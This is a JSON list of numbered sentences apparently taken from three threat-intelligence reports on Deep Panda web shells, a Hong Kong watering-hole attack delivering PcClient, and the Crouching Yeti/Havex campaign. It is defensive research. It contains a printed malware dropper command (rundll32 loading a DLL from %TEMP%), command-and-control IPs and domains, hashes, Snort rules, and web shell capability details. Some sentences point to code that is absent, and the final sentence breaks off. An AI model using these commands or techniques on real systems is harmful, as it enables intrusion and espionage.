{"0": "Disclaimer : CrowdStrike derived this information from investigations in non - classified environments .", "1": "Since we value our client 's privacy and interests , some data has been redacted or sanitized .", "2": "Crowdstrike presents \" Mo ' Shells Mo ' Problems \" - A four part series featuring two unique web shells used by a Chinese threat group we call Deep Panda .", "3": "The series will culminate with a CrowdCast in April 2014 detailing a case study of the incident response investigation conducted to identify these web shells .", "4": "Special thanks to Josh Phillips of the CrowdStrike Global Intelligence Team for providing the technical analysis in this blog post .", "5": "Today we 'll cover part one of this series , which provides an overview of what web shells are , functionality of two web shells recently identified during an incident response investigation and how they were leveraged by the attacker .", "6": "Parts two through four will provide details on successful analytical techniques you can use to discover web shells within your environment .", "7": "A Web Shell is a file containing backdoor functionality written in a web scripting language such ASP , ASPX , PHP or JSP .", "8": "When a web shell is hosted on an internet facing victim system , an adversary can remotely access the system to perform malicious actions .", "9": "Deep Panda is a China based threat group CrowdStrike has observed targeting companies in the defense , legal , telecommunication and financial industries .", "10": "Crowdstrike has observed Deep Panda adopting web shells as their primary access back into a victim organization .", "11": "This is an interesting shift as web shells have typically been seen as only a first stage into obtaining a persistent foothold in an environment .", "12": "Previously , web shells were quickly abandoned once persistent second stage malware was successfully beaconing .", "13": "To assist organizations with identifying web shells in their environment , this post will cover two popular Deep Panda web shells .", "14": "By gaining insight into their capabilities and footprint , organizations should find it feasible to detect and remediate these backdoors .", "15": "After it is replaced by more robust backdoors , it may be left in place as a last resort should remediation take place .", "16": "At a diminutive 28 bytes , it is one of the smallest Active Server Page ( ASP ) backdoors in the wild .", "17": "In a recent case , we witnessed this web shell written to a standalone file ( named showimg.asp ) , but it could easily be injected into an existing page , making it even stealthier .", "18": "The code for this web shell can be found below .", "19": "ASP uses Microsoft Visual Basic ( VBScript ) as its implementation language .", "20": "The code above uses the chr ( ) function to convert an integer into a character , which is then passed as an argument to the ASP Request ( ) object .", "21": "The Request ( ) object will search the Query String for any keys matching the input .", "22": "In our case , the code is equivalent to Request . QueryString ( ' * ' ) .", "23": "The request object will look for chr(42 ) which is an asterisk ( * ) , returning whatever is passed to it in a HTTP GET or POST .", "24": "Next , the Execute ( ) function will execute any value returned by the lookup .", "25": "Effectively , an attacker can form a request that will execute any VBScript code .", "26": "As you might imagine , this is a powerful capability .", "27": "For example , this code can perform any of the following actions .", "28": "This web shell is an example of a \" thick client \" shell , meaning that while the server side code is quite small , attackers typically use a larger GUI client to construct the sent commands .", "29": "The client GUI runs on the attacker 's system and hence is not typically found within the victim network .", "30": "As a simple example of an encoded command , the following GET request would cause the backdoor to execute the code Response . Write(\" < h1>Hello World</h1 > \" ) and would render \" Hello World \" to be printed in the web browser .", "31": "Path : C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\<VERSION>\\ MD5 Hash : cc875db104a602e6c12196fe90559fb6 File Size : 45187 Table 4 : Metadata of \" system_web.aspx \" System_web.aspx is an excellent example of a more robust web shell used to replace Deep Panda 's traditional beaconing command and control infrastructure .", "32": "It is an ASP.NET backdoor written in C # , with far more capabilities than we saw with the showimage.asp sample .", "33": "The web shell supports a form of authentication to protect against unauthorized access .", "34": "This prevents its discovery from search engine indexing , vulnerability scanning tools and other unauthorized access to the backdoor .", "35": "In order to bypass authentication , a user session must satisfy one of three options .", "36": "Since web shells are text - based , we can easily see how this authentication takes place .", "37": "First , the code checks if a cookie by the name of cp exists .", "38": "If so , the response object has its End ( ) method invoked , denying the user access .", "39": "Next , the code uses the IsValidUser()method and checks the Hyper Text Transport Protocol ( HTTP ) headers for the Keep - Alive value , which , if equal to 320 , will return true .", "40": "If the value does not equal 320 the IsValidUser()method iterates over the Request . UserLanguages collection searching for a language named es - DN , and if found , the IsValidUser ( ) method will return true .", "41": "If neither check passes , the code returns false and the code will finally check for the presence of a cookie named < REDACTED>.", "42": "If the cookie is present , the authentication step is satisfied .", "43": "If not , a blank web page with no content is displayed .", "44": "After successful authentication , the attacker is provided with the following page .", "45": "System_web.aspx packs a large amount of functionality into a compact interface .", "46": "It provides the following capabilities .", "47": "This command depends on the contents of the first unlabeled textbox1 .", "48": "Provider= or Driver= - Will connect using the OleDbConnection class .", "49": "Data Source= - The code will connect using the SqlConnection class .", "50": "iis:// - If this appears in unlabeled textbox1 , the code will use data from the second unlabeled textbox2 to execute Active Directory requests .", "51": "This command also depends on the text contained in the unlabeled textbox1 .", "52": "If the field is left empty , the code will assume a valid path to a file on the local machine and will read and display contents to user .", "53": "Data Source= - the code will assume that the unlabeled textbox2 contains a valid SQL query and will execute it and display the results .", "54": "http:// - If this appears in unlabeled textbox1 , download content from the assumed URL .", "55": "$ SEX \u2013 If this appears in unlabeled textbox1 , pass the contents to the Server . Execute ( ) method .", "56": "Execute contents in unlabeled textbox1 as a SQL query and return binary data to adversary .", "57": "Execute contents in unlabeled textbox1 as a SQL statement and return valid textual data to adversary .", "58": "Then executes xp_cmdshell ( which executes the Bulk Copy Program ) to copy the data from that table to a file whose name is specified in unlabeled textbox2 .", "59": "After the file is saved , the code deletes the temporary table .", "60": "If unlabeled textbox1 is a local file on infected system , the file is read and displayed to attacker .", "61": "\\\\ - If unlabeled textbox1 starts with \\\\ , use xp_cmdshell to execute the copy command to copy file to % windir%\\Temp\\temp.bin .", "62": "Then , issue the dir command and display results to user .", "63": "Finally , delete the temporary file % windir%\\Temp\\temp.bin .", "64": "Perform Active Directory queries .", "65": "The code handles create , delete , set , get , and enum queries , while any query not matching those is executed directly .", "66": "All commands are executed using the System . DirectoryServices API .", "67": "Simple wrapper around the CSharpCodeProvider API , allowing the adversary to compile and execute arbitrary C # source code .", "68": "Detatch Checkbox Specifies whether commands run from the Exec button will have their output redirected and displayed to the adversary when the command is finished executing .", "69": "As we will see , identifying web shells can be much harder than finding malicious binaries .", "70": "In our next post , we will discuss techniques for identifying web shells .", "71": "Stay tuned for Parts 2 - 4 as we cover File Stacking , Web Log Review , and Network Detection .", "72": "In the meantime , register now for the April 1st CrowdCast .", "73": "Over the past several months an increasing number of strategic web compromises ( \" wateringholes \" ) have been discovered on websites in Hong Kong .", "74": "This rise in activity coincides with the Occupy Central protests .", "75": "In this post we will talk about a single attack , whilst not trying to distract attention from the vast number of attacks and subsequent compromises that remain persistent in Hong Kong .", "76": "Whilst going about our daily business we were alerted to a website that began serving a malicious payload alongside its usual web page .", "77": "The initial investigation revealed that the attack and associated payloads are part of an ongoing attack campaign by an Advanced Persistent Threat group that is known to target various sectors of industry and Government in Hong Kong .", "78": "In this instance we have chosen to obfuscate details of the compromised website to protect the identity of the victim .", "79": "This website belongs to a private educational institution who , since being notified about the compromise , has removed the malicious executable and remediated the compromised of their server , thus breaking a crucial link in the chain of this attack .", "80": "The website in question was implanted with some HTML code that simply reaches out to a secondary website and downloads malware .", "81": "Whilst this in itself is not interesting the methodology used to obfuscate code and evade detection are .", "82": "The underlying code in the first page that loads exploits a vulnerability in Internet Explorer ( CVE-2014 - 6332 ) and runs several scripts , each with support for different operating systems and methods of downloading and executing a file from a website .", "83": "The first script is obfuscated Visual Basic Script ( \" VBS \" ) By decoding this we can see the true intentions of the script \u2013 which opens a whole new can of worms .", "84": "This code is extremely interesting because not only does it contain VBScript but also contains PowerShell script .", "85": "The Powershell script is compressed and Base64 encoded .", "86": "The VBScript then downloads the first binary payload into the user 's temporary directory and names it ' plug.exe ' .", "87": "If the operating system version is too old to support Powershell then the script will attempt to use VBScript .", "88": "This malware implant is commonly detected by anti- virus as Swisyn .", "89": "It appears that this functionality is included because the secondary payload comes in both 32bit and 64bit versions .", "90": "Both of these second stage payloads are obfuscated but decoded with a simple bitwise operation as per below In this scenario , the secondary payloads can be decoded using a simple subtraction of 3 followed by an XOR of 3 from each byte .", "91": "This file is then written to % User%\\Application Data\\Microsoft in a newly created folder name ' wuauclt ' .", "92": "The filename depends on the operating system version , for Windows XP it is \" clbcatq.dll \" , for Windows Vista and above it is \" profapi.dll \" .", "93": "Once this file has been written to disk a file from the Windows System32 folder is copied into the directory .", "94": "This file , named ' wuauclt.exe ' , is the Windows update client interface and it a standard windows file .", "95": "This file is encoded and not decoded at this stage of the attack .", "96": "The 64bit version of this dropper is vastly similar in functionality although it offers slightly more efficiency in the code .", "97": "The decoding routine is more simplified than its 32bit counterpart and the decoding key is hardcoded The following pseudo - code can decode both 32bit and 64bit versions of the DLL stored in ' wuauclt.dat ' Not to dwell on a dropper , let 's move on to the second stage malware .", "98": "The malware second stage is now loaded and running .", "99": "Interestingly , this payload is also detected by anti - virus as Swisyn .", "100": "This DLL is again fairly simple and acts as a secondary dropper .", "101": "In order to do this the malware firstly decodes a file that was dropped by the previous stage \u2013 in this case it is \" wuauclt.dat \" .", "102": "This file , once decoded is the third and final payload .", "103": "Finally to wrap up , an entry is created in the registry named ' wuauclt ' is created under ' HKCU\\Software\\Microsoft\\Windows\\Current Version\\Run ' to ensure that this file is executed upon user - login .", "104": "Finally we are left with a full payload .", "105": "Unsurprisingly the 3rd and final stage of this part of the attack is a fully fledged RAT ( Remote Administration Tool ) , which is detected by anti - virus as PCClient .", "106": "A high - level view of the command structure gives us an idea as to how simple this functionality can seem , but does not turn away from how damaging the affects can be .", "107": "As we usually see with APT attacks the malware controllers use a specific ID to code their attack campaign , which in this case is ' C00BBB ' .", "108": "This information gives the attacker a brief description about the machine .", "109": "The information consists of .", "110": "For example .", "111": "Unencoded data Encoded data 44 45 4C 4C 2D 31 37 38 DELL-178 BA B9 B2 B2 51 4D 47 46 QMGF 44 33 43 00 00 00 00 00 D3C .....", "112": "BA 4B BB 7E 7E 7E 7E 7E K ~~~~~ 00 00 00 00 00 00 00 00 ........", "113": "7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 00 00 00 00 00 00 00 00 ........", "114": "7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 00 00 00 00 00 00 00 00 ........", "115": "7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 00 00 00 00 00 00 00 00 ........", "116": "7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 00 00 00 00 00 00 00 00 ........", "117": "7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 00 00 00 00 00 00 00 00 ........", "118": "7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 35 31 32 4D 42 00 00 00 512 MB ...", "119": "49 4D 4C B1 BC 7E 7E 7E IML ~~~ 00 00 00 00 00 00 00 00 ........", "120": "7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 00 00 00 00 00 00 00 00 ........", "121": "7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 00 00 00 00 00 00 00 00 ........", "122": "7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 57 69 6E 20 58 50 20 53 Win XP S A7 95 90 5E A6 AE 5E AB \u2022\u2022^ ^ 50 33 20 28 42 75 69 6C P3 ( Buil AE 4B 5E 56 BC 89 95 92 K^V \u2030\u2022 ' 64 20 32 36 30 30 29 00 d 2600 ) .", "123": "9A 5E 4C 48 4E 4E 55 7E \u0161^LHNNU~ 00 00 00 00 00 00 00 00 ........", "124": "7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 00 00 00 00 00 00 00 00 ........", "125": "7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 00 00 00 00 00 00 00 00 ........", "126": "7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 00 00 00 00 00 00 00 00 ........", "127": "7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 00 00 00 00 00 00 00 00 ........", "128": "7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 43 30 30 42 42 42 00 00 C00BBB ..", "129": "BB 4E 4E BC BC BC 7E 7E NN ~~ Whilst this may seem to make the data harder to recover it actually makes detection of the traffic easier .", "130": "To decode the traffic a simple calculation can be performed by reversing the encoding operations .", "131": "In this case the malware simply increases the initial encoding key by 1 , then adds this value to each byte in the buffer and finally XOR 's each byte .", "132": "Once again , the following pseudo - code can decode this data During in the investigation we performed analysis of the infrastructure that this malware communicates with .", "133": "On this occasion we have not been able to gain physical access to the command and control server as it is legitimate , but compromised production infrastructure .", "134": "The graph below shows the flow in which various parts of the attack are loaded and how they chain together .", "135": "This attack can be detected and/or mitigated at each stage .", "136": "In order to help organisations protect themselves we have created a number of network IDS rules and disk - scan rules that can be used with Snort and Yara .", "137": "Rules are provided in a best - effort basis and we can not vouch for their efficiency in your environment .", "138": "Wateringhole code Encoded version of PcClient PcClient malware beaconing alert tcp $ HOME_NET any - > $ EXTERNAL_NET [ 80,443 ] ( msg:\"MALWARE \u2013 DTL ID 12012015 - PcClient beacon \" ; flow : established , to_server ; content:\"|BB 4E 4E BC BC BC 7E 7E| \" ; nocase ; offset:160 ; depth:8 ; classtype : trojan - activty ; sid : YOUR_SID ; rev:20122014 ; ) Malware domain alert udp $ HOME_NET any - > $ EXTERNAL_NET 53 ( msg:\"MALWARE - DTL ID 12012015 - C2 Domain \" ; content:\"|06|aoemvp|03|com \" ; classtype : trojan - activity ; sid : YOUR_SID ; rev : 20122014 ; ) C2 server IP # 1 alert ip $ HOME_NET any < > 45.64.74.101 any ( msg:\"MALWARE - DTL ID 12012015 \u2013 C2 IP Address \" ; classtype : trojan - activity ; sid : YOUR_SID ; rev : 20122014 ; ) C2 server IP # 2 alert ip $ HOME_NET any < > 103.229.127.104 any ( msg:\"MALWARE - DTL ID 12012015 - C2 IP Address \" ; classtype : trojan - activity ; sid : YOUR_SID ; rev : 20122014 ; ) The following artefacts were found during the investigation MD5s Network artefacts a6a18c846e5179259eba9de238f67e41 c.aoemvp.com 55f84d88d84c221437cd23cdbc541d2e aoemvp.com a6a18c846e5179259eba9de238f67e41 lim.kiu@hotmail.com 279ef79f904476ba0f9f44c87358bb1f 45.64.74.101 42b76c0503a6bf21f1ea86e0b14d67ea 103.229.127.104 cff25fe24a90ef63eaa168c07008c2bb ad17eff26994df824be36db246c8fb6a f66b64ef984ac46ac7395358059979bc efd9dc39682312d6576468f5c0eb6236 For all questions relating to the publication or specifics in this document please contact us via one of the following methods .", "139": "Twitter : @dragonthreatlab Website : http://dragonthreat.blogspot.hk Email : dragonthreatlabs@gmail.com Kind regards , Dan Dragon Threat Labs", "140": "Energetic Bear / Crouching Yeti is an actor involved in several advanced persistent threat ( APT ) campaigns that have been active going back to at least the end of 2010 .", "141": "Targeted sectors include .", "142": "Most of the victims we identified fall into the industrial / machinery building sector , indicating this is of special interest .", "143": "To infect the victims , the attackers rely on three methods .", "144": "During the attacks , the Crouching Yeti uses several malware / Trojans , which exclusively infect Windows systems .", "145": "The dozens of known Yeti exploit sites and their referrer sites were legitimate , compromised sites .", "146": "They ran vulnerable content management systems or vulnerable web applications .", "147": "None of the exploits used to compromise the servers were known to be zero - day .", "148": "None of the client side exploits re - used from the open source metasploit framework were zero - day .", "149": "Overall , we observed about 2,800 victims worldwide , the most prevalent attack tool being the Havex Trojan .", "150": "We believe this group is highly determined and focused on a very specific industrial sector of vital interest .", "151": "It uses a variety of ways to infect its victims and exfiltrate strategic information .", "152": "The analyzed data seems to suggest the following points .", "153": "This report provides technical details on how they perform their operations .", "154": "This section analyzes all the aspects we could find about how this actor performs its campaigns .", "155": "The Crouching Yeti actor performed a massive surveillance operation targeting strategic victims , many of them in the industrial / manufacturing sector .", "156": "There were different ways of delivering of its malware including waterholing , spearphishing and adding malware to legitimate installers .", "157": "We were able to identify several victims , including high - profile ones and dozens of domains used in the campaign .", "158": "As far as we know the group behind Crouching Yeti delivers its malware using at least three different methods .", "159": "The first method uses a legitimate software installer repackaged to contain the malicious DLL .", "160": "hxxp://www.ewon.biz / software / eCatcher / eCatcherSetup.exe \" eWon \" is a Belgian producer of SCADA and industrial network equipment , which helps define this attack method as a watering hole attack .", "161": "Likely , the attackers gained access to eWon 's ftp site and replaced the legitimate file with one that is bound with the Havex dropper several times .", "162": "Another example that involves a hijacked application from a PLC - related vendor is a Trojanized mbCHECK installer which replaced the original legitimate version freely downloadable from the vendor 's website .", "163": "The legitimate version can be downloaded for free from the vendor 's website .", "164": "The vendor - MB Connect Line - is a company which specializes in software for remote maintenance of PLC systems : MB Connect Line GmbH(hxxp://www.mbconnectline.com / index.php / en/ ) .", "165": "In this case , the dropped DLL was Havex version 043 .", "166": "This exploit drops the Havex loader DLL , which is stored in an encrypted form in the XDP file .", "167": "The exploit is delivered as an XDP file ( XML Data Package ) which is actually a PDF file packaged within an XML container .", "168": "The XDP file contains an SWF exploit and two files ( encrypted with XOR ) stored in the invalid section of the PDF .", "169": "One of the files is Havex DLL ( version 038 ) , the other is a small JAR file which is used to copy and run the DLL by executing the following command .", "170": "cmd /c copy < fname_passed_as_param > % TEMP%\\\\explore.dll /y & rundll32.exe % TEMP%\\\\explore.dll , RunDllEntry SWF executes the action script , which contains another SWF file which in turn uses the CVE- 2011 - 0611 vulnerability to run the shellcode .", "171": "The shellcode then looks for a specific signature in the memory ( which signs the start of encrypted DLL ) , decrypts and loads it .", "172": "Finally , this actor actively compromises legitimate websites for watering hole attacks .", "173": "These hacked websites in turn redirect to malicious JAR or html files hosted on other sites maintained by the group ( exploiting CVE-2013 - 2465 , CVE-2013 - 1347 , and CVE-2012 - 1723 in Java 6 , Java 7 , IE 7 and IE 8) , which then drop the Havex loader , the Karagany backdoor and helper tools .", "174": "These sites run an exploit kit known as \" LightsOut \" .", "175": "It appears that the \" LightsOut \" exploit kit is exclusively used by Energetic Bear / Crouching Yeti .", "176": "From the dozens of Yeti exploit sites we reviewed , the malicious code was nothing more than slightly modified metasploit java exploits delivering the Havex loader .", "177": "Some sort of internal review must have pushed them towards the LightsOut EK .", "178": "KSN data records help provide a list of Crouching Yeti related exploit delivery from dozens of these sites .", "179": "In earlier cases ( July 2013 ) , successful Java exploitation served from nahoonservices.com would cascade into more Yeti components planted on victim systems .", "180": "The java exploit downloaded Karagany backdoors , which in turn downloaded stealers from 91.203.6.71 .", "181": "Ksn data recorded at least 20 victim sites that were compromised and injected with Yeti iframes , redirecting hundreds of visitors to compromised Yeti exploit sites .", "182": "Most of these redirector sites were owned by western and Eastern European power players , investors , legal advisors and advocates , and European and US industrial IT equipment makers .", "183": "The compromised sites hosting the LightsOut Exploit Kit were fairly trafficked , legitimate sites .", "184": "Their content varies widely , from California winemakers to Cuban travel agencies and Iranian general interest / religious inspiration sites .", "185": "Finally , other second stage tools were simply retrieved by the downloaders over http from various servers .", "186": "Some of these Yeti sites , like kinoporno.org , served both Havex and these tools .", "187": "KSN events recorded the sites serving Windows Credential Editor and custom credential and document stealing tools .", "188": "The Crouching Yeti group has different tools of choice for their operations .", "189": "This section describes them from a technical perspective .", "190": "In the meantime , another routine is constantly checking the % TEMP% folder for all * .xmd files .", "191": "All samples of this component contain a statically linked bzip2 library .", "192": "Versions > = 01B also contain an RSAeuro library , used to encrypt log files and decrypt downloadable modules .", "193": "Public keys for encryption are hardcoded in the binary and/or stored in the configuration section .", "194": "In total , we identified 124 different samples of Havex loaders , belonging to 27 different versions .", "195": "As of June 2014 , the latest version number we have is 044 .", "196": "The URL addresses of the C&C servers ( which are indeed compromised websites ) are either hardcoded in the binary , or - in versions = > 038 - specified in the configuration section inside the ICT resource .", "197": "This resource is compressed with bzip2 and encrypted with XOR .", "198": "There are usually 2 - 4 URLs per binary , different for each malware version and sometimes also different between samples of the same version .", "199": "The request contents depends on the malware version and it may include such information as unique bot i d , malware version number , OS version number , and some other data from configuration , as well as the harvested information logged into the * .yls file ( if any ) .", "200": "Then the malware searches the HTML code of each returned page for havex markers and saves the data between the markers into a temporary file .", "201": "These modules are hosted between the havex markers in the HTML code of compromised websites .", "202": "The module code is usually XORed with \" 1312312 \" then compressed with BZIP2 and finally base64 encoded .", "203": "Once downloaded into the % TEMP%\\*.xmd file by the main Havex DLL , the code is decoded , decompressed , saved into the temporary DLL file and loaded into the memory .", "204": "In order to do that , some of the modules make use of additional 3rd stage 3rd party executables .", "205": "Each module contains configuration information stored in an encrypted and compressed form inside a resource .", "206": "Configuration data includes 29-byte UID ( unique ID ) , a 1024-bit RSA Public key ( base64 encoded ) and other necessary info ( like file paths , etc . ) .", "207": "All harvested data is compressed , encrypted and written into the % TEMP%\\*.yls files , which are then sent to the C&C by the main Havex / Sysmain module .", "208": "The \" yls \" files are encrypted with the 3DES crypto algorithm using a random 192-bit key ( 168 bit effective ) .", "209": "The 3DES key is encrypted using the public RSA 1024 key and therefore never transferred in plain text to attackers .", "210": "To query the OPC servers , it uses the following interfaces .", "211": "Harvested data includes .", "212": "This module collects contact details stored in all outlook.nk2 files and writes them to the % TEMP%\\{rand}.yls file .", "213": "Outlook.nk2 is the file where Outlook ( version since 2007 ) keeps contact details in order to use them with the AutoComplete feature .", "214": "List of browsers supported by the tool ( from the product 's website ) .", "215": "In - depth analysis of the Havex loader and its related modules is presented in Appendix 2 .", "216": "This component is a simple downloader with a functionality similar to the Havex component .", "217": "It writes the data ( some ASCII strings ) from between < I6></I6 > tags to the file in % TEMP%\\Low\\~task.tmp and the data ( binary data XORed with 0x0A ) from between < B6></B6 > tags into the % TEMP%\\Low\\~ldXXXX.TMP file .", "218": "Then it decrypts the ldXXXX.TMP file and loads it into memory .", "219": "The Ddex loader is analyzed in more detail in Appendix 4 .", "220": "With a set of 11 commands , the malware is able to .", "221": "There are also commands used for maintenance purposes .", "222": "Every variant of this malware has its own set of servers .", "223": "As usual , the attackers are using webservers - most likely compromised ones - as part of their C&C - infrastructure .", "224": "To communicate with the C&C - server , the Trojan makes use of asymmetric encryption with a hardcoded pair of private and public keys .", "225": "Another public key is used to encrypt files , which are collected in a local dropzone on the victim 's file system .", "226": "The files in that dropzone will be submitted to the attacker later , all in one go .", "227": "Appendix 3 provides in - depth analysis of the Sysmain backdoor .", "228": "This component is written in .NET and is very similar to The Sysmain backdoor .", "229": "The settings of the RAT are stored in the registry as BASE64 encoded values .", "230": "The data in this case is stored between the havexhavex tags , it is then decrypted and decoded ( base64 ) .", "231": "The RAT supports 13 commands including .", "232": "The ClientX backdoor is analyzed in depth in Appendix 5 .", "233": "Affected browsers include Internet Explorer , Firefox , Mozilla and Opera .", "234": "The folder name and filename are chosen from a list of strings hardcoded in the binary .", "235": "It also creates the C:\\ProgramData\\Mail\\MailAg\\ folder , where the information harvested by downloaded modules will be stored .", "236": "Known parameters used in C&C communication are .", "237": "This module is used to drop and run the DuckLink CmdCapture tool - a 3rd party freeware AutoIt application for capturing screenshots ( hxxp://www.ducklink.com/ ) .", "238": "Saved information includes path , size and modification time .", "239": "File matching patterns .", "240": "The Command and Control Servers are compromised legitimate websites , like Blogs , from different countries .", "241": "In total we have identified 219 unique domain names for these C&C servers hosted in 21 different countries .", "242": "We found most hosted C&Cs in the United States ( 81 servers ) , Germany ( 33 servers ) , the Russian Federation ( 19 servers ) and the United Kingdom ( 7 servers ) .", "243": "The table below shows the distribution of victims affected by the samples identified according to our KSN data .", "244": "Victims infected with samples from any of the Crouching Yeti group 's malware were found in .", "245": "65 of these C&C servers , in the following countries , were monitored during our investigation .", "246": "This monitoring enabled us to get a list of the victims connected to them .", "247": "The C&C Backend is written in PHP , consisting of 3 files .", "248": "The Backdoors interact with \" source.php \" , which is the control script .", "249": "These are its functions on execution .", "250": "1 .", "251": "Collect the following information .", "252": "2 .", "253": "Write the above information to \" testlog.php \" , separated by \" Tabulator \" and base64- encoded , with the following syntax .", "254": "< timestamp>\\t < victim ip - address>\\t < proxy>\\t < botID>\\t < request - uri>\\t < useragent > 3 .", "255": "Write all transferred HTTP - GET Variables to \" < botID>.log \" , separated by \" Tabulator \" and base64-encoded .", "256": "4 .", "257": "If the bot executes an HTTP - POST - request , the transferred data is written to the file \" < botID>.ans \" , enclosed in \" xdata \"- Tag with timestamp .", "258": "( \" ans \" is the acronym for \" Answer \" ) .", "259": "5 .", "260": "Check for any \" < botID>_*.txt \" files a.", "261": "If found the first step is to append the timestamp , filename and a \" sent \" Status indicated to \" < botID>.log \" .", "262": "Then the file content is transferred to the bot , embedded into HTML with the HTML - Body \" No data ! \" and the HTML - Comment \" havex \" , which contains the data to be transferred .", "263": "Finally the file on the server is removed .", "264": "If this removal fails it is logged to \" < botID>.log \" .", "265": "b.", "266": "If no matching file is found , an HTML - Response is sent with an empty \" havex \" HTML - Comment and HTML - Body text \" Sorry , no data corresponding to your request . \" The term \" victim \" in this section refers to a botID ( unique String of the Backdoor ) , connecting to one or more C&C Servers .", "267": "Based on the 45 C&C Servers wemonitored , a total of 2,811 unique Victims were discovered .", "268": "The average number of victims per C&C is 70 .", "269": "The following chart depicts the first ( red line ) and last ( blue line ) appearance of each victim on the C&C.", "270": "The \" FirstHit \" shows how the rate of accumulating new victims has accelerated over the course of 2014 .", "271": "\" LastHit \" shows how the last connection of victims to C&C servers also increases over time .", "272": "This could mean victims are disinfecting their computers , or it may be that they simply report to a different C&C server that we do not monitor .", "273": "Mapping the unique hits of victims per day also indicates a decrease of \" active \" infections .", "274": "The following chart clearly shows a difference between weekdays ( groups of five higher bars ) and weekends ( two lower bars ) .", "275": "The daily unique hit - rate fell by about half from around 800 connections at the beginning of 2014 to around 400 connections per week - day by the middle of the year .", "276": "More than half of the victims always connect from the same IP address .", "277": "Fewer than half of the victims connect from two or more different IP addresses as the following graph shows .", "278": "This might indicate that some of the victims are behind proxies , which makes sense for corporate environments .", "279": "Victims using many different IP addresses may indicate laptops .", "280": "The following chart visualizes all the unique victims connecting to C&C servers .", "281": "The main C&C Servers can be clearly seen in Russia and the USA .", "282": "The victims are distributed across 99 different countries .", "283": "From the total of 2,811 victims , it was possible to accurately identify 106 of them .", "284": "Appendix 8 contains a brief description about the sector / company in which these victims operate .", "285": "The table below summarizes the distribution of the identified victims by sector .", "286": "Based on our monitoring , the most widespread Backdoor is Havex with a total of 2,470 infected systems , mostly based in USA and Spain .", "287": "32 different versions of Havex are used among all victims , with 51 victims left without any identifiable Havex version .", "288": "Havex Version 024 , compiled at the end of 2012 , is the most widespread .", "289": "The most common Operating System among victims is Windows XP , but Windows 8.1 is also on the list .", "290": "The Sysmain victims connect to six of the monitored C&C servers , where 261 unique victims were counted , located in 38 different countries .", "291": "Victims of the Clientx backdoor connect to 2 of the monitored C&C Servers , where 10 unique Victims were counted in 5 different countries .", "292": "Based on the analysis of the monitored C&C Servers we can identify some clusters based on malware versions and the victims .", "293": "This graph visualizes these relations .", "294": "Every dot represents a victim , different Backdoors and versions are colored differently .", "295": "The C&C Servers are also represented as dots where several clients connect .", "296": "Grey lines are connections from a victim to its C&C Server .", "297": "Some C&C Servers are dedicated to a given version of a backdoor ( big Cluster ) .", "298": "Others share connections with different backdoor versions and different backdoors .", "299": "Breaking this down to the sectors of the identified victims , we can not see any correlation between C&Cs and victims .", "300": "The same sectors are targeted with different backdoor versions .", "301": "Compared to our other APT research the available data is more non - specific than usual .", "302": "There simply is no one piece or set of data that would lead to the conclusion that the threat actor is Bear , Kitten , Panda , Salmon , or otherwise .", "303": "Significant data points below .", "304": "It is rare to see file timestamps used as a precise , primary source of information when it comes to threat actor attribution .", "305": "In previous reports , these timestamps have been used as supporting , or secondary pieces of data .", "306": "They may help to suggest or support a time range for attacker activity , but they are very easily modified .", "307": "So it is not very helpful to focus on this data set .", "308": "The strings present in the backdoors , web components , and exploits are in English .", "309": "Almost 200 malicious binaries and the related operational content all present a complete lack of Cyrillic content , the opposite of our documented findings from researching Red October , Miniduke , Cosmicduke , Snake , and TeamSpy .", "310": "The OPC module strings include typos and bad grammar .", "311": "Some are so bad they are almost silly and there does n't seem to be a consistent pattern here .", "312": "Programm was started at % 02i:%02i:%02i Start finging of LAN hosts ...", "313": "Finding was fault .", "314": "Unexpective error Was found % i hosts in LAN : Hosts was't found .", "315": "There are also three interesting strings inside the Karagany backdoor .", "316": "identifiant ( which is French for identifier ) , fichier ( French for file ) and liteliteliteskot ( lite scot is Swedish for little sheet ) Timestamp analysis is based on a total of 154 collected binaries .", "317": "Highlights .", "318": "Activity / Year ( all samples ) .", "319": "Activity / Weekdays based on compilation time .", "320": "Activity / Hours ( UTC ) based on compilation time .", "321": "All the exploit servers delivered slightly modified ripped content from open source repositories .", "322": "All the servers appear to be hacked servers .", "323": "According to the available data , no zero - day exploits were used in any of these attacks , either to compromise the servers in the first place , or delivered as client side attack exploits by the Lights Out Exploit Kit .", "324": "While this purely malicious re - use of metasploit PoC highlights the danger that these attack tools pose , it is also unusual to see an exclusively metasploit attack toolset effectively used in this way , delivered from what appear to be a chain of higher value compromised sites .", "325": "All of these compromised web applications were vulnerable to freely available offensive security tools .", "326": "We acknowledge that many of the compromised referrer servers were related to power producers in some way .", "327": "However , these targets almost seem an afterthought , as the exploit servers themselves were compromised web servers from Cuban travel agency sites , a Californian winery site , a US based women 's fashion site , an Iranian general interest / religious inspiration site , a number of dating and adult content websites , and a variety of others .", "328": "Although , we note that the known Trojanized software packages were ICS / SCADA related as well , possibly because those victim sets or environments required special attention .", "329": "So , while there was a strong set of offensive activities on power producers during the campaigns , it was by no means the full focus of them .", "330": "While it may be \" shocking \" to observe power producers around the world targeted by any one threat actor , this actor 's attack activity does not appear to be constrained to power producers .", "331": "The related industries of interest show a much broader global scope than previously discussed , and the geographic regions of interest have gone completely undiscussed .", "332": "For example , Spain had the highest number of victims .", "333": "However , it appears that there was no significant correlation between the victim location and the C&C geolocation .", "334": "And , according to our data , the list also includes victim organizations fitting the following additional categories .", "335": "The Crouching Yeti actor has been performing massive surveillance campaigns in recent years , since at least 2010 .", "336": "Their targets included thousands of victims of which we were able to identify a few , confirming Crouching Yeti 's interest in several strategic sectors .", "337": "The distribution strategy of the group focuses on methods following this targeted philosophy , including spear phishing and waterholing .", "338": "Noticeably , they also compromised legitimate software packages from strategic actors in the SCADA sector in order to infect their final victims .", "339": "The victim list confirms that the 